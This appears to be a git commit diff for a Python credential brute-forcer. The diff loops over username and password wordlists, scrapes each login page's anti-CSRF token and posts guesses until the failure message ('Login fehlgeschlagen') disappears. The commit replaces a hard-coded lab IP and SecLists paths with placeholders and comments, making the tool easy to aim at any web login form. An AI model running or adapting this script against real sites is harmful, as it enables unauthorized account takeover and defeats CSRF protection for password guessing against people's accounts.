39ef7e05fbb8c800e44583d7ee8d156e4fc1116a
SchmidAlex <91736634+SchmidAlex@users.noreply.github.com>
2024-05-03 08:23:43 +0200

    some helpfull notes and made it more adjustable

--- main.py
+++ main.py
@@ -5,22 +5,34 @@ import sys
 
 def bruteforcer():
         session = requests.session()
-        with open("./SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt", "r") as file:
+        # Get password list, Change list to desired one
+        with open("[Insert Password list]", "r") as file:
                 passwords = [line.strip() for line in file.readlines()]
-        with open("./SecLists/Usernames/top-usernames-shortlist.txt", "r") as file:
+        # Get username list, Change list to desired one
+        with open("[Insert Username list]", "r") as file:
                 usernames = [line.strip() for line in file.readlines()]
 
+        # Send requests
         for username in usernames:
                 for password in passwords:
-                        login = session.get("http://10.10.152.108/login.php")
-                        user_token = re.search("'user_token' value='(.*?)'", login.text).group(1)
+                        # Set url to desired one to read out the anti-csrf token
+                        login = session.get("[Get token]")
+
+                        # Read out csrf token in form, Set "csrf_token" to given key of token
+                        user_token = re.search("'csrf_token' value='(.*?)'", login.text).group(1)
+                        
+                        # Set post data, key value pair maybe differs in every webapp
                         post_data = {
                                 "username" : username,
                                 "password" : password,
                                 "Login" : "Login",
                                 "user_token" : user_token
                         }
-                        validation = session.post("http://10.10.152.108/login.php", data=post_data)
+
+                        # Set url to desired one to send post request
+                        validation = session.post("[Post request url]", data=post_data)
+
+                        # Validation, set the text to the one which matches with response
                         if "Login fehlgeschlagen" in validation.text:
                                 #print("Nope")
                                 pass
